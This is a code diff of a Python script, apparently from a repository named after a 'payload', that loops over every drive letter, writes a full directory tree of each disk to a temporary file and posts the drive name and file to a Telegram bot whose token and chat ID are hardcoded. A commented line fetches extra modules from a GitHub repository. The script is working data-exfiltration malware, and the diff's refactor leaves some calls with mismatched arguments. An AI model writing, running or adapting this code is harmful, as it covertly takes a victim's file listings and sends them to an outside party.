@@ -6,6 +6,9 @@ import tempfile
 import importlib.util
 import string
 
+chat_id = "-4102145810"
+token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
+
 def is_python_installed():
     try:
         subprocess.check_output(['python', '--version'])
@@ -62,14 +65,10 @@ def download_and_install_whl(url, filename):
     except Exception as e:
         print(f"Error downloading or installing whl: {e}")
 
-def send_message(message):
-    chat_id = "-4102145810"
-    token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
+def send_message(chat_id, token, message):
     r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")
 
-def send_file(filepath):
-    chat_id = "-4102145810"
-    token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"
+def send_file(chat_id, token, filepath):
     data = {'chat_id' : chat_id}
     with open(filepath, 'rb') as file:
         files = {
@@ -106,37 +105,34 @@ def tree(directory, file, prefix=''):
             connector = '├── ' if index < len(contents) - 1 else '└── '
             file.write(prefix + connector + name + '\n')
 
-def process_path(letterpath):
+def process_path(chat_id, token, disk):
     with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
-        tree(letterpath, temp_file)
+        tree(disk, temp_file)
         temp_file_path = temp_file.name
-    print(f"{letterpath} : {temp_file_path}")
-    send_message(letterpath)
+    print(f"{disk} : {temp_file_path}")
+    send_message(disk)
     send_file(temp_file_path)
 
-def disk_tree(disk, parameter):
-    if parameter == 1:
-        process_path(disk)
-    elif parameter == 2:
-        if not (os.path.isdir(disk + "Windows\\system32") or os.path.isdir("/usr/bin")):
-            process_path(disk)
-
-def scan_disks():
+def scan_disks(parameter):
     maj_letters = list(string.ascii_uppercase)
     disks = []
     for maj_letter in maj_letters:
         letterpath = f"{maj_letter}:\\"
         if os.path.isdir(letterpath):
-            disks.append(letterpath)
+            if parameter == 1:
+                disks.append(letterpath)
+            elif parameter == 2:
+                if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
+                    disks.append(letterpath)
     return disks
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
 #Scan all available disks function
-disks = scan_disks()
-
 #Param 1 : for all disks
 #Param 2 : for no OS disks
+disks = scan_disks(1)
+
 for disks in disks:
-    disk_tree(disks, 1)
+    process_path(chat_id, token, disks)
